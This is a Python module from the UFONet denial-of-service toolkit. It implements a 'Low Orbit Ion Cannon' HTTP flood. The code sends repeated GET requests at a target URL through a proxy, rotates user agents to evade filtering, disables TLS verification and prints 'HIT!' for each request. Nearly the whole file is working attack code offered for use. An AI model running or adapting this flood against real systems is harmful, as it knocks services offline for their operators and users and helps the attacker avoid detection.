#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
This file is part of the UFONet project, https://ufonet.03c8.net

Copyright (c) 2013/2020 | psy <epsylon@riseup.net>

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, random
try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning # black magic
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except:
    print("\nError importing: requests lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install python3-requests'\n")
    sys.exit(2)

# UFONet DoS Web LOIC (Low Orbit Ion Cannon)
def ionize(self, target, rounds, proxy):
    n=0
    try:
        proxyD = { 
              "http"  : proxy, 
            }
        for i in range(0, int(rounds)):
            n=n+1
            self.user_agent = random.choice(self.agents).strip()
            headers = {'User-Agent': str(self.user_agent)}
            try:
                r = requests.get(target, headers=headers, proxies=proxyD, verify=False)
                print("[Info] [AI] [LOIC] Firing 'pulse' ["+str(n)+"] -> [HIT!]")
            except:
                print("[Error] [AI] LOIC: Failed to engage with 'pulse' ["+str(n)+"]")
    except:
        print("[Error] [AI] [LOIC] Failing to engage... -> Is still target online? -> [Checking!]")

class LOIC(object):
    def __init__(self):
        self.agents_file = 'core/txt/user-agents.txt' # set source path to retrieve user-agents
        self.agents = []
        f = open(self.agents_file)
        agents = f.readlines()
        f.close()
        for agent in agents:
            self.agents.append(agent)

    def attacking(self, target, rounds, proxy):
        print("[Info] [AI] Low Orbit Ion Cannon (LOIC) is ready to fire: [" , rounds, "pulses ]")
        ionize(self, target, rounds, proxy) # attack with LOIC using threading
